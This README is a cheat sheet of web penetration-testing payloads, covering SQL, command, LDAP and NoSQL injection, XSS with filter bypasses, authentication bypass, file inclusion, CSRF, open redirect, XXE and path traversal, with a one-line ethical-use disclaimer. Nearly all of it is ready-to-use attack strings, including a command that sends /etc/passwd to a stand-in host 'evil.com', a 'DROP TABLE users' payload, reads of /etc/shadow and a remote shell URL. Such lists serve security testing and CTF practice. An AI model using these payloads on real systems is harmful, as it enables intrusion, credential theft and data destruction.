#  Common Penetration Testing Payloads

This README contains a list of commonly used scripts and payloads for penetration testing web applications. Use these for ethical hacking, CTFs, and security research in safe environments only.

---

##  Injection Attacks

###  SQL Injection (SQLi)
```sql
OR 1=1--
admin'--
' UNION SELECT NULL, username, password FROM users--
admin' OR '1'='1
'; DROP TABLE users;--
```

###  Command Injection
```bash
; ls -la
&& whoami
| id
$(whoami)
; curl http://evil.com/callback?data=$(cat /etc/passwd)
```

###  LDAP Injection
```ldap
*)(uid=*))(|(uid=*
admin)(&)
' OR 1=1)(| (uid=*))
```

###  NoSQL Injection
```json
{ "username": { "$ne": null }, "password": { "$ne": null } }
' || 1==1 //
```

---

##  Cross-Site Scripting (XSS)

###  Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert('XSS')">
```

###  Filter Bypass
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<body onload=alert(1)>
"><script>alert(document.cookie)</script>
```

---

##  Authentication Bypass
```sql
' OR '1'='1'--
admin' #
admin" || "1"=="1"
```

---

##  File Inclusion

###  Local File Inclusion (LFI)
```
../../../../etc/passwd
/etc/shadow
php://filter/convert.base64-encode/resource=index.php
```

###  Remote File Inclusion (RFI)
```
http://evil.com/shell.txt
```

---

## 🧾 Cross-Site Request Forgery (CSRF)
```html
<form action="http://target.com/delete" method="POST">
  <input type="hidden" name="id" value="123">
  <input type="submit">
</form>
```

---

##  Open Redirect
```
/redirect?url=https://evil.com
/login?next=//evil.com
```

---

##  XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

##  Path Traversal
```
../../../../windows/win.ini
%2e%2e%2f  (URL-encoded ../)
```

---
